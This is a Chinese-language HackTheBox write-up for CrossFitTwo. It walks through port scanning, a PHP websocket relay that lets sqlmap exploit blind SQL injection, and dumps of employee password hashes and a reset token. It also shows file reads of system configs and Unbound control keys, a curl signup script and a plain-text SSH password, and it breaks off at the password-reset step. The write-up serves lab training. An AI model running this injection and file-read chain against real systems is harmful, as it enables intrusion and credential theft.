commonName=unbound| Not valid before: 2021-01-11T07:01:10|_Not valid after: 2040-09-28T07:01:101 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.91%I=7%D=5/11%Time=609A2D63%P=x86_64-apple-darwin19.6.0%SF:r(GetRequest,3541,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\r\\nCoSF:nnection:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8\\r\\nDSF:ate:\\x20Tue,\\x2011\\x20May\\x202021\\x2007:08:01\\x20GMT\\r\\nServer:\\x20OpenSF:BSD\\x20httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;SF:\\n&lt;html\\x20lang=\\\"zxx\\\"&gt;\\n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"SF:UTF-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"description\\\"\\x20content=\\\"YoSF:ga\\x20StudioCrossFit\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"keywords\\\"\\x20SF:content=\\\"Yoga,\\x20unica,\\x20creative,\\x20html\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;metSF:a\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scalSF:e=1\\.0\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20cSF:ontent=\\\"ie=edge\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;CrossFit&lt;/title&gt;\\n\\n\\x20\\x2SF:0\\x20\\x20&lt;!--\\x20Google\\x20Font\\x20--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=\\SF:\"https://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&amp;display=swSF:ap\\\"\\x20rel=\\\"stylesheet\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=\\\"https://foSF:nts\\.googleapis\\.com/css\\?family=Oswald:400,500,600,700&amp;display=swap\\\"\\SF:x20rel=\\\"stylesheet\\\"&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;!--\\x20Css\\x20Styles\\x20--&gt;\\SF:n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.mSF:in\\.css\\\"\\x20type=\\\"text/css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"styleshSF:e\")%r(HTTPOptions,3541,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\SF:r\\nConnection:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8SF:\\r\\nDate:\\x20Tue,\\x2011\\x20May\\x202021\\x2007:08:01\\x20GMT\\r\\nServer:\\x2SF:0OpenBSD\\x20httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n&lt;!DOCTYPE\\x20SF:html&gt;\\n&lt;html\\x20lang=\\\"zxx\\\"&gt;\\n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charsSF:et=\\\"UTF-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"description\\\"\\x20contentSF:=\\\"Yoga\\x20StudioCrossFit\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"keywords\\SF:\"\\x20content=\\\"Yoga,\\x20unica,\\x20creative,\\x20html\\\"&gt;\\n\\x20\\x20\\x20\\x2SF:0&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initialSF:-scale=1\\.0\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"SF:\\x20content=\\\"ie=edge\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;CrossFit&lt;/title&gt;\\n\\n\\xSF:20\\x20\\x20\\x20&lt;!--\\x20Google\\x20Font\\x20--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20hSF:ref=\\\"https://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&amp;displSF:ay=swap\\\"\\x20rel=\\\"stylesheet\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20href=\\\"httpsSF:://fonts\\.googleapis\\.com/css\\?family=Oswald:400,500,600,700&amp;display=swSF:ap\\\"\\x20rel=\\\"stylesheet\\\"&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;!--\\x20Css\\x20Styles\\x2SF:0--&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrSF:ap\\.min\\.css\\\"\\x20type=\\\"text/css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stSF:yleshe\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 32.06 seconds 80 member area是一个子域名，加hosts： 110.10.10.232 employees.crossfit.htb crossfit.htb employees.crossfit.htb 目录扫描对两个系统目录扫描，没什么有用的： 12345678910111213141516171819202122232425gobuster dir -u http://10.10.10.232/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404 -t 50/about-us.php (Status: 200) [Size: 15733]/blog.php (Status: 200) [Size: 15369]/classes.php (Status: 200) [Size: 25946]/contact.php (Status: 200) [Size: 8007]/css (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/css/]/elements.php (Status: 200) [Size: 19654]/fonts (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/fonts/]/img (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/img/]/images (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/images/]/index.php (Status: 200) [Size: 19041]/index.php (Status: 200) [Size: 19041]/js (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/js/]/main.html (Status: 200) [Size: 931]/readme.txt (Status: 200) [Size: 410]/vendor (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/vendor/]gobuster dir -u http://employees.crossfit.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404 -t 50/css (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/css/]/index.php (Status: 200) [Size: 4412]/index.php (Status: 200) [Size: 4412]/js (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/js/]/vendor (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/vendor/] websocket查看流量可以发现一个gym.crossfit.htb的websocket： 这个域名同样加hosts，相关代码在ws.min.js里： chat加完hosts后访问，右下角有个聊天框，31秒自动消失： 并且有一次性token，每次响应新token，下次请求使用： websocket-client所以可以自己写一个client，枚举信息： https://amphp.org/websocket-client/ 123composer require amphp&#x2F;websocket-clientphp -S 0.0.0.0:7777 ws.min.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function updateScroll() &#123; var e = document.getElementById('chats'); e.scrollTop = e.scrollHeight&#125;var token,ws = new WebSocket('ws://gym.crossfit.htb/ws/'),pingTimeout = setTimeout(() =&gt;&#123; ws.close(), $('.chat-main').remove()&#125;, 31000);function check_availability(e) &#123; var s = new Object; s.message = 'available', s.params = String(e), s.token = token, ws.send(JSON.stringify(s))&#125;$('.chat-content').slideUp(),$('.hide-chat-box').click(function () &#123; $('.chat-content').slideUp()&#125;),$('.show-chat-box').click(function () &#123; $('.chat-content').slideDown(), updateScroll()&#125;),$('.close-chat-box').click(function () &#123; $('.chat-main').remove()&#125;),ws.onopen = function () &#123;&#125;,ws.onmessage = function (e) &#123; 'ping' === e.data ? (ws.send('pong'), clearTimeout(pingTimeout)) : (response = JSON.parse(e.data), answer = response.message, answer.startsWith('Hello!') &amp;&amp; $('#ws').show(), token = response.token, $('#chat-messages').append('&lt;li class=\"receive-msg float-left mb-2\"&gt;&lt;div class=\"receive-msg-desc float-left ml-2\"&gt;&lt;p class=\"msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded\"&gt;' + answer + '&lt;/p&gt;&lt;/div&gt;&lt;/li&gt;'), updateScroll())&#125;,$('#sendmsg').on('keypress', function (e) &#123; if (13 === e.which) &#123; $(this).attr('disabled', 'disabled'); var s = $('#sendmsg').val(); if ('' !== s) &#123; $('#chat-messages').append('&lt;li class=\"send-msg float-right mb-2\"&gt;&lt;p class=\"msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded\"&gt;' + s + '&lt;/p&gt;&lt;/li&gt;'); var t = new Object; t.message = s, t.token = token, ws.send(JSON.stringify(t)), $('#sendmsg').val(''), $(this).removeAttr('disabled'), updateScroll() &#125; &#125;&#125;); websocket-client.php1234567891011121314151617181920&lt;?phprequire 'vendor/autoload.php';use Amp\\Websocket\\Client;Amp\\Loop::run(function () &#123; $connection = yield Client\\connect('ws://gym.crossfit.htb/ws/'); $message = yield $connection-&gt;receive(); $payload = yield $message-&gt;buffer(); $token = json_decode($payload, true)[\"token\"]; $check = json_encode(array('message' =&gt; 'available', 'params' =&gt; $_GET['id'], 'token' =&gt; $token)); yield $connection-&gt;send($check); $message = yield $connection-&gt;receive(); $payload = yield $message-&gt;buffer(); header(\"Content-Type: application/json\"); printf($payload); $connection-&gt;close();&#125;); sql注入websocket获取信息也是通过数据库，因此可以进行sql注入： 12sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!'sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 dbs123456sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --dbsavailable databases [3]:[*] crossfit[*] employees[*] information_schema employees两张表，一张是账号信息，一张是密码重置token： 12345678sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees --tablesDatabase: employees[2 tables]+----------------+| employees || password_reset |+----------------+ employees tabledavid.palmer@crossfit.htb是administrator： 12345678910111213sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees -T employees --dumpDatabase: employeesTable: employees[4 entries]+----+-----------------------------+---------------+------------------------------------------------------------------+| id | email | username | password |+----+-----------------------------+---------------+------------------------------------------------------------------+| 1 | david.palmer@crossfit.htb | administrator | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 || 2 | will.smith@crossfit.htb | wsmith | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 || 3 | maria.williams@crossfit.htb | mwilliams | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c || 4 | jack.parker@crossfit.htb | jparker | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 |+----+-----------------------------+---------------+------------------------------------------------------------------+ password_reset table123456789sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees -T password_reset --dumpDatabase: employeesTable: password_reset[0 entries]+-------+-------+---------+| token | email | expires |+-------+-------+---------++-------+-------+---------+ password_reset尝试去reset administrator密码： 表里可以得到token，但现在不知道使用格式： 12345678910sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 -D employees -T password_reset --dump --fresh-queriesDatabase: employeesTable: password_reset[1 entry]+------------------------------------------------------------------+---------------------------+---------------------+| token | email | expires |+------------------------------------------------------------------+---------------------------+---------------------+| 5fda7b56a8c5b514a528fc02fcf583584436aa28b7eafe2db0790c36a805a284 | david.palmer@crossfit.htb | 2021-05-11 08:54:10 |+------------------------------------------------------------------+---------------------------+---------------------+ 文件读取需要继续枚举，尝试sql读文件(非常慢),opembsd相关配置文件： https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current /etc/passwd123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/etc/passwd\"root:*:0:0:Charlie &amp;:/root:/bin/kshdaemon:*:1:1:The devil himself:/root:/sbin/nologinoperator:*:2:5:System &amp;:/operator:/sbin/nologinbin:*:3:7:Binaries Commands and Source:/:/sbin/nologinbuild:*:21:21:base and xenocara build:/var/empty:/bin/kshsshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin_portmap:*:28:28:portmap:/var/empty:/sbin/nologin_identd:*:29:29:identd:/var/empty:/sbin/nologin_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin_x11:*:35:35:X Server:/var/empty:/sbin/nologin_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologinwww:*:67:67:HTTP Server:/var/www:/sbin/nologin_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin_file:*:104:104:file privsep:/var/empty:/sbin/nologin_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologinnobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologinlucille:*:1002:1002:,,,:/home/lucille:/bin/cshnode:*:1003:1003::/home/node:/bin/ksh_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin_redis:*:686:686:redis account:/var/redis:/sbin/nologindavid:*:1004:1004:,,,:/home/david:/bin/cshjohn:*:1005:1005::/home/john:/bin/cshftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin /etc/login.conf根据配置文件，使用有yubikey： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/etc/login.conf\"# $OpenBSD: login.conf,v 1.16 2020/06/23 15:45:34 naddy Exp $## Sample login.conf file. See login.conf(5) for details.### Standard authentication styles:## passwd Use only the local password file# chpass Do not authenticate, but change user's password (change# the YP password if the user has one, else change the# local password)# lchpass Do not login; change user's local password instead# radius Use radius authentication# reject Use rejected authentication# skey Use S/Key authentication# activ ActivCard X9.9 token authentication# crypto CRYPTOCard X9.9 token authentication# snk Digital Pathways SecureNet Key authentication# tis TIS Firewall Toolkit authentication# token Generic X9.9 token authentication# yubikey YubiKey authentication## Default allowed authentication stylesauth-defaults:auth=passwd,skey:# Default allowed authentication styles for authentication type ftpauth-ftp-defaults:auth-ftp=passwd:## The default values# To alter the default authentication types change the line:# :tc=auth-defaults:\\# to read something like: (enables passwd, \"myauth\", and activ)# :auth=passwd,myauth,activ:\\# Any value changed in the daemon class should be reset in default# class.#default:\\ :path=/usr/bin /bin /usr/sbin /sbin /usr/X11R6/bin /usr/local/bin /usr/local/sbin:\\ :umask=022:\\ :datasize-max=768M:\\ :datasize-cur=768M:\\ :maxproc-max=256:\\ :maxproc-cur=128:\\ :openfiles-max=102400:\\ :openfiles-cur=102400:\\ :stacksize-cur=4M:\\ :localcipher=blowfish,a:\\ :tc=auth-defaults:\\ :tc=auth-ftp-defaults:## Settings used by /etc/rc and root# This must be set properly for daemons started as root by inetd as well.# Be sure to reset these values to system defaults in the default class!#daemon:\\ :ignorenologin:\\ :datasize=infinity:\\ :maxproc=infinity:\\ :openfiles-max=102400:\\ :openfiles-cur=102400:\\ :stacksize-cur=8M:\\ :auth-ssh=yubikey:\\ :auth-su=reject:\\ :tc=default:## Staff have fewer restrictions and can login even when nologins are set.#staff:\\ :datasize-cur=1536M:\\ :datasize-max=infinity:\\ :maxproc-max=512:\\ :maxproc-cur=256:\\ :ignorenologin:\\ :requirehome@:\\ :tc=default:## Authpf accounts get a special motd and shell#authpf:\\ :welcome=/etc/motd.authpf:\\ :shell=/usr/sbin/authpf:\\ :tc=default:## Building ports with DPB uses raised limits#pbuild:\\ :datasize-max=infinity:\\ :datasize-cur=8192M:\\ :maxproc-max=1024:\\ :maxproc-cur=384:\\ :priority=5:\\ :tc=default:## Override resource limits for certain daemons started by rc.d(8)#bgpd:\\ :openfiles=512:\\ :tc=daemon:unbound:\\ :openfiles=512:\\ :tc=daemon: /etc/ssh/sshd_configroot需要公钥和密码，非root需要密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/etc/ssh/sshd_config\"# $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $# This is the sshd server system-wide configuration file. See# sshd_config(5) for more information.# The strategy used for options in the default sshd_config shipped with# OpenSSH is to specify options with their default value where# possible, but leave them commented. Uncommented options override the# default value.#Port 22#AddressFamily any#ListenAddress 0.0.0.0#ListenAddress ::#HostKey /etc/ssh/ssh_host_rsa_key#HostKey /etc/ssh/ssh_host_ecdsa_key#HostKey /etc/ssh/ssh_host_ed25519_key# Ciphers and keying#RekeyLimit default none# Logging#SyslogFacility AUTH#LogLevel INFO# Authentication:#LoginGraceTime 2mPermitRootLogin yes#StrictModes yes#MaxAuthTries 6#MaxSessions 10#PubkeyAuthentication yes# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2# but this is overridden so installations will only check .ssh/authorized_keysAuthorizedKeysFile .ssh/authorized_keys#AuthorizedPrincipalsFile none#AuthorizedKeysCommand none#AuthorizedKeysCommandUser nobody# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts#HostbasedAuthentication no# Change to yes if you don't trust ~/.ssh/known_hosts for# HostbasedAuthentication#IgnoreUserKnownHosts no# Don't read the user's ~/.rhosts and ~/.shosts files#IgnoreRhosts yes# To disable tunneled clear text passwords, change to no here!#PasswordAuthentication yes#PermitEmptyPasswords no# Change to no to disable s/key passwords#ChallengeResponseAuthentication yes#AllowAgentForwarding yes#AllowTcpForwarding yes#GatewayPorts no#X11Forwarding no#X11DisplayOffset 10#X11UseLocalhost yes#PermitTTY yes#PrintMotd yes#PrintLastLog yes#TCPKeepAlive yes#PermitUserEnvironment no#Compression delayed#ClientAliveInterval 0#ClientAliveCountMax 3#UseDNS no#PidFile /var/run/sshd.pid#MaxStartups 10:30:100#PermitTunnel no#ChrootDirectory none#VersionAddendum none# no default banner path#Banner none# override default of no subsystemsSubsystem sftp /usr/libexec/sftp-server# Example of overriding settings on a per-user basis#Match User anoncvs# X11Forwarding no# AllowTcpForwarding no# PermitTTY no# ForceCommand cvs serverMatch User root AuthenticationMethods publickey,passwordMatch User *,!root AuthenticationMethods password /etc/httpd.conf根据配置文件，除了chat和employees还有其他的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/etc/httpd.conf\"# $OpenBSD: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $types &#123; include \"/usr/share/misc/mime.types\"&#125;server \"0.0.0.0\" &#123; no log listen on lo0 port 8000 root \"/htdocs\" directory index index.php location \"*.php*\" &#123; fastcgi socket \"/run/php-fpm.sock\" &#125;&#125;server \"employees\" &#123; no log listen on lo0 port 8001 root \"/htdocs_employees\" directory index index.php location \"*.php*\" &#123; fastcgi socket \"/run/php-fpm.sock\" &#125;&#125;server \"chat\" &#123; no log listen on lo0 port 8002 root \"/htdocs_chat\" directory index index.html location match \"^/home$\" &#123; request rewrite \"/index.html\" &#125; location match \"^/login$\" &#123; request rewrite \"/index.html\" &#125; location match \"^/chat$\" &#123; request rewrite \"/index.html\" &#125; location match \"^/favicon.ico$\" &#123; request rewrite \"/images/cross.png\" &#125;&#125; /etc/relayd.conf得到crossfit-club.htb，加hosts： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/etc/relayd.conf\"table&lt;1&gt;&#123;127.0.0.1&#125;table&lt;2&gt;&#123;127.0.0.1&#125;table&lt;3&gt;&#123;127.0.0.1&#125;table&lt;4&gt;&#123;127.0.0.1&#125;http protocol web&#123; pass request quick header \"Host\" value \"*crossfit-club.htb\" forward to &lt;3&gt; pass request quick header \"Host\" value \"*employees.crossfit.htb\" forward to &lt;2&gt; match request path \"/*\" forward to &lt;1&gt; match request path \"/ws*\" forward to &lt;4&gt; http websockets&#125;table&lt;5&gt;&#123;127.0.0.1&#125;table&lt;6&gt;&#123;127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4&#125;http protocol portal&#123; pass request quick path \"/\" forward to &lt;5&gt; pass request quick path \"/index.html\" forward to &lt;5&gt; pass request quick path \"/home\" forward to &lt;5&gt; pass request quick path \"/login\" forward to &lt;5&gt; pass request quick path \"/chat\" forward to &lt;5&gt; pass request quick path \"/js/*\" forward to &lt;5&gt; pass request quick path \"/css/*\" forward to &lt;5&gt; pass request quick path \"/fonts/*\" forward to &lt;5&gt; pass request quick path \"/images/*\" forward to &lt;5&gt; pass request quick path \"/favicon.ico\" forward to &lt;5&gt; pass forward to &lt;6&gt; http websockets&#125;relay web&#123; listen on \"0.0.0.0\" port 80 protocol web forward to &lt;1&gt; port 8000 forward to &lt;2&gt; port 8001 forward to &lt;3&gt; port 9999 forward to &lt;4&gt; port 4419&#125;relay portal&#123; listen on 127.0.0.1 port 9999 protocol portal forward to &lt;5&gt; port 8002 forward to &lt;6&gt; port 5000 mode source-hash&#125; crossfit-club.htb另一个需要登录的： api enum查看流量发现/api/auth，那就枚举其他api： 12345678910gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/http://crossfit-club.htb/api/auth (Status: 200) [Size: 66]http://crossfit-club.htb/api/ping (Status: 200) [Size: 71]gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/http://crossfit-club.htb/api/Login (Status: 200) [Size: 50]http://crossfit-club.htb/api/login (Status: 200) [Size: 50]http://crossfit-club.htb/api/signup (Status: 200) [Size: 50] signupapi里发现signup,网页的signup是禁用，尝试直接通过api： 响应只有管理员可以添加用户，无法注册： signup.sh1234567891011121314151617181920212223242526272829303132333435363738#!/bin/bashRHOST=\"crossfit-club.htb\"RPORT=80USER=\"miao\"PASS='miao@123'EMAIL=\"miao@crossfit.htb\"COOKIE=\"$(mktemp -u)\"PROXY=\"127.0.0.1:8087\"# Get CSRF tokenTOKEN=$(curl -s \\ -c \"$&#123;COOKIE&#125;\" \\ -x \"$&#123;PROXY&#125;\" \\ \"http://$&#123;RHOST&#125;:$&#123;RPORT&#125;/api/auth\" \\ | jq .token \\ | tr -d '\"')# Sign upcat - &lt;&lt;EOF &gt; signup.json&#123; \"username\": \"$&#123;USER&#125;\", \"password\": \"$&#123;PASS&#125;\", \"email\" : \"$&#123;EMAIL&#125;\", \"confirm\" : \"$&#123;EMAIL&#125;\"&#125;EOFcurl -s \\ -b \"$&#123;COOKIE&#125;\" \\ -H \"Content-Type: application/json\" \\ -H \"X-CSRF-TOKEN: $&#123;TOKEN&#125;\" \\ -d \"$(cat signup.json | jq -c)\" \\ -x \"$&#123;PROXY&#125;\" \\ \"http://$&#123;RHOST&#125;:$&#123;RPORT&#125;/api/signup\" | jq .# Clean uprm -rf \"$&#123;COOKIE&#125;\" Unbound注意前面还有个8953端口，这个是Unbound的control-port，而unbound-control需要server证书，客户端密钥，客户端证书几个文件，还是通过sql去读文件获取： https://man.openbsd.org/unbound.conf /var/unbound/etc/unbound.conf首先读取配置文件，根据配置文件得到相关文件路径： 12345678910111213141516171819202122232425262728sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/var/unbound/etc/unbound.conf\"server: interface: 127.0.0.1 interface: ::1 access-control: 0.0.0.0/0 refuse access-control: 127.0.0.0/8 allow access-control: ::0/0 refuse access-control: ::1 allow hide-identity: yes hide-version: yes msg-cache-size: 0 rrset-cache-size: 0 cache-max-ttl: 0 cache-max-negative-ttl: 0 auto-trust-anchor-file: \"/var/unbound/db/root.key\" val-log-level: 2 aggressive-nsec: yes include: \"/var/unbound/etc/conf.d/local_zones.conf\"remote-control: control-enable: yes control-interface: 0.0.0.0 control-use-cert: yes server-key-file: \"/var/unbound/etc/tls/unbound_server.key\" server-cert-file: \"/var/unbound/etc/tls/unbound_server.pem\" control-key-file: \"/var/unbound/etc/tls/unbound_control.key\" control-cert-file: \"/var/unbound/etc/tls/unbound_control.pem\" download files下载所需的几个文件： 123sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/var/unbound/etc/tls/unbound_server.pem\" sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/var/unbound/etc/tls/unbound_control.key\"sqlmap -u http://10.211.55.12:7777/client.php\\?id\\=1 --batch --string='Good news!' --technique=B --threads=10 --file-read=\"/var/unbound/etc/tls/unbound_control.pem\" 如果嫌太慢就直接scp吧，这里直接给出来后面才能得到的密码： 1234567scp david@10.10.10.232:/var/unbound/etc/tls/unbound_server.pem unbound_server.pemscp david@10.10.10.232:/var/unbound/etc/tls/unbound_control.key unbound_control.keyscp david@10.10.10.232:/var/unbound/etc/tls/unbound_control.pem unbound_control.pemssh david@10.10.10.232NWBFcSe3ws4VDhTB status之后使用本地配置文件，测试remote control： crossfit.conf1234remote-control: server-cert-file: &quot;&#x2F;home&#x2F;miao&#x2F;Desktop&#x2F;HTB&#x2F;CrossFitTwo&#x2F;unbound_server.pem&quot; control-key-file: &quot;&#x2F;&#x2F;home&#x2F;miao&#x2F;Desktop&#x2F;HTB&#x2F;CrossFitTwo&#x2F;unbound_control.key&quot; control-cert-file: &quot;&#x2F;home&#x2F;miao&#x2F;Desktop&#x2F;HTB&#x2F;CrossFitTwo&#x2F;unbound_control.pem&quot; 密码重置 &amp; dns 